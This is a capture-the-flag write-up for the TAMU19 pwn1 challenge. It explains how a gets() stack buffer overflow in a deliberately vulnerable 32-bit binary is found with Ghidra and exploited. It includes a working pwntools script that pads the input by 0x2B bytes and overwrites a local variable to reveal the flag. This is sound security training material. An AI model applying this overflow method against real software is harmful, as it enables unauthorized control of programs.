# Overflow Exploit: TAMU19 pwn1 Overflow Challenge
This is a writeup solving the TAMU19 pwn1, a stack overflow challenge.

The challenge is stored in [this repository](https://github.com/hoppersroppers/nightmare/tree/master/modules/04-Overflows/04-bof_variable/tamu19_pwn1) but you can also find this in this repository. (You will need the flag.txt file to erun it successfully)

To start off, we run the binary to see how it behaves and also run the `file` command. 

<img src="https://user-images.githubusercontent.com/101567957/187087132-cacc5582-4892-4d41-9577-c22c8d1e4cf7.png" width="700">

This tells us it is a 32-bit binary.
From the binary behavior we can also see that most likely, a password of sorts is necessary to proceed to the next stage.

But as there is not much more we can see from running the binary, let's load it up into Ghidra.

<img src="https://user-images.githubusercontent.com/101567957/187087024-7705fe1f-26f7-4c91-91ac-fab8088b5e45.png" width="700">

Initially, the main function in the decompiler seems pretty straightforward. The code in C asks for our name ("What... is your name?") and the string compare function two lines below tells us that the right answer is "Sir Lancelot of Camelot". The second question "What... is your quest?" is also run against a string compare function which will only accept "To seek the Holy Grail." as an answer.

The part third question is where the fun starts. 
```
  puts("What... is my secret?");
  gets(local_43);
  if (local_18 == -0x215eef38) {
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }
 ```
The only way to get the flag is to make sure the ```local_18``` equals to  -0x215eef38 (or 0xdea110c8 in unsigned hex). But that is not the same variable as the one our answer gets written to, the local_43 variable.

This is what it looks like in assembly:

<img src="https://user-images.githubusercontent.com/101567957/188269907-1eea7e22-dbcf-4069-9a84-d31a28709203.png" width="900">

Again, the CMP instruction at 000108b2 is run against the ```local_18``` variable not against the ```local_43``` where the gets funtcion stores the input. 

This is where the overflow comes in. 

When you look at the header of the main function, we see where both variables are stored in memory. "local_43", the variable which records our input, is at [-0x43] in the stack, and the variable we need to change is at [-0x18]. 


<img src="https://user-images.githubusercontent.com/101567957/188269626-038c7d8c-b85e-4a74-aaa6-be5f908d4791.png" width="900">


The idea here is that if we provide an input which is large enough to fill the space between the two variables, that is  0x43 - 0x18, which equals to 0x2B, we will be able to get to the ```local_18``` variable and write into it. 

Fortunately for us, we can do just that with a short piece of Python code. It uses the pwntools Python module. You can find the entire file in this repo.

```
# import pwntools 
from pwn import *

# creates a process which runs the pwn1 executable
p = process('./pwn1')

# creates the payload
payload = b""
# pads the payload by 0x2b to get to the local_18 variable
payload += b"0"*0x2b
# at the location of the local_18 variable rewrites the variable to 0xdea110c8 (in the form of a byte string)
payload += p32(0xdea110c8)

# sends the correct answers to the process with the two first answers
p.sendline(b"Sir Lancelot of Camelot")
p.sendline(b"To seek the Holy Grail.")

# sends the payload which reqrites the local_18 variable
p.sendline(payload)

# allows interaction with the terminal
p.interactive()
```
The key part is creating the payload where we add 0x2B worth of zeroes followed by the value of 0xdea110c8 in little-endian. This payload is then sent as an input for the local_43 variable which then spills into the local_18 with just the right value and gets us the flag.
